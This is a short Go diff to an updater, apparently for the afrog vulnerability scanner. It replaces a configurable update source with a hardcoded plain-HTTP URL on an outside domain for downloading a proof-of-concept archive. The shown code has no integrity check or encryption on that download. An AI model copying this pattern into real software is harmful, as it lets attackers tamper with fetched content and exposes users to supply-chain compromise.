@@ -112,7 +112,7 @@ func (u *AfrogUpdate) Download() error {
 		return err
 	}
 
-	resp, err := grab.Get(u.HomeDir, upHost+upPath)
+	resp, err := grab.Get(u.HomeDir, "http://tool.zuoxueba.org/poc/afrog-pocs.zip")
 	if err != nil {
 		return fmt.Errorf("%s", err.Error())
 	}
